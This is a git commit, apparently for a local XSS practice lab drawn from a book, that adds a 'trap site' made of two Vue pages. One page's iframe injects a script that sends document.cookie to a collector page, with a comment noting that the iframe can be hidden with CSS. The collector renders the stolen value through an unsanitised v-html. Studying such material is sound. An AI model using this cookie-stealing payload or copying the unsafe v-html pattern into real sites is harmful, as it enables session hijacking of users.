a367a15d073c7cf451dde47571078f3350c6eae1
watanata <watanabetatsuya@lifull.com>
2019-05-16 10:14:55 +0900

    first commit for trap site

---
+++ pages/hoge.vue
@@ -0,0 +1,17 @@
+<template>
+  <div>
+    <div v-html="sid">
+    </div>
+  </div>
+</template>
+
+<script>
+export default {
+  async asyncData(context) {
+    // if(process.server) {
+      // context.res.setHeader("X-XSS-Protection","0")
+    // }
+    return { sid: context.query.sid };
+  }
+};
+</script>
---
+++ pages/xss.vue
@@ -0,0 +1,12 @@
+<template>
+  <div>
+    <div>
+      本の91ページのやつ</br>
+      以下のiframeはCSSで隠せる
+    </div>
+    <iframe width=320 height=100 src="http://localhost:3000/show?name=<script>window.location='http://localhost:3333/hoge?sid='%2Bdocument.cookie;</script>"></iframe>
+    <iframe width=320 height=100 src="http://localhost:3000/show?name=watanata"></iframe>
+  </div>
+
+</template>
+
